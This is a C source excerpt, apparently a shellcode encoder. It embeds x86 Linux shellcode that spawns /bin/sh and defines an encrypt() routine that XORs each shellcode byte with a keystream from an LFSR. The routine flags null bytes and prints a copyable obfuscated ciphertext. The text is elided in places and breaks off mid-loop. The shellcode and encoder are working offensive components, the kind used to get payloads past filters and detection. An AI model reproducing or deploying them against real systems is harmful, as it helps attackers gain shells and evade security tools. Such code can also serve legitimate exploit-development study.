...
"\x31\xc0\xb0\x0b\xbb\xff\xff\xff\x01\x81\xe3\x2f\x73\x68\x02\x53\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
...
int encrypt() //Encrypt the given Plaintext
{
	lfsr=iv;			//Initialize the LFSR
	unsigned char key_byte;
	printf("Encrypting with IV=\%08X ",iv);
	printf("and %d cycles:\n",cycles);
	for(int i = 0; shellcode[i] != '\0'; ++i)	//For the complete shellcode
	{
		key_byte = clock(cycles);		//Key Byte
		printf("\\x%02x with ",shellcode[i]);
		printf("\\x%02x to ",key_byte);
		shellcode[i] = shellcode[i] ^ key_byte;	//Encryption with XOR
		if(shellcode[i] == '\0')
		{
			printf("\n\nNULL-Byte alert -> Bad key\n");
			return 1;
		}
		printf("\\x%02x\n",shellcode[i]);
	}
	printf("End of encryption.\n\nCopyable Ciphertext:\n");
	for(int i = 0; shellcode[i] != '\0'; ++i)	//Output only
	{
